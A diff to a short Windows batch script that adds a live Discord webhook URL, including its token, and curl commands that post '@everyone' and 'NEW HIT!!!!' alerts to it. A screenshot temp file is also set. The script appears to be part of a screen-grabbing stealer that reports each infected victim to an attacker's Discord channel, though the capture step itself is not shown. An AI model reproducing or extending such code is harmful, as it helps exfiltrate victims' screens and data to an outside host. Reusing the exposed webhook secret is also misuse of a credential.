@@ -1,7 +1,7 @@
 @echo off
 mode con: cols=25 lines=15
 set "tempfile=%~dp0screenshot.png"
-set webhook=*ur webhook here*
+set webhook=*https://discord.com/api/webhooks/1225945343833931867/ED2NLVdbXpc1mvHgJ5LUMtUyKaZn6O5UpivYDhE_XzC8NcCnmaKUeVN3X85TCNOi5ZbK*
 curl -X POST -d "content=||@here||||@everyone||" %webhook%
 curl -X POST -d "content=NEW HIT!!!!" %webhook%
 
